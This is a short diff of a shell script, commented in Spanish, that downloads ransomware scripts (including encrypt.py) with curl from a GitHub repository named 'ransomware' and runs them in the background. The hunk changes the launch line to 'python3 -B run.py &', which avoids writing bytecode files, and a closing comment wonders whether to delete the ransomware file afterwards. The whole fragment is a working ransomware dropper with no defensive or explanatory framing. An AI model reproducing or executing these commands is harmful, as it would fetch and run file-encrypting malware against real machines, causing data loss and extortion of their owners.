@@ -7,7 +7,7 @@ curl -O https://raw.githubusercontent.com/isoprophlex/ransomware/ransomware-with
 curl -O https://raw.githubusercontent.com/isoprophlex/ransomware/ransomware-without-socket/encrypt.py
 
 # Ejecutar script de ransomware
-python3 run.py &
+python3 -B run.py &
 
 # Eliminar archivo de ransomware?
 # ?
